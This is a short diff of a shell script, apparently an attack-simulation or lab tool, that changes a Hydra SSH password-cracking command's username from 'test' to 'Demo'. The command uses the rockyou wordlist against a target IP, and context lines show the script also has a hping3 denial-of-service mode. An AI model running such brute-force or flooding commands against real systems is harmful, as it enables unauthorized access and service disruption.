@@ -37,9 +37,9 @@ if [ "$MODE_ARG" = "hydra" ]; then
     echo "[*] Starting Hydra SSH Password Cracking..."
     
     # 指定されたコマンドに変更
-    # -l test: ユーザー名 test
+    # -l Demo: ユーザー名 Demo
     # -P /usr/share/wordlists/rockyou.txt: ロックユー辞書
-    hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4 -V -e ns
+    hydra -l Demo -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4 -V -e ns
 
 else
     # --- DoS Attack (hping3) ---
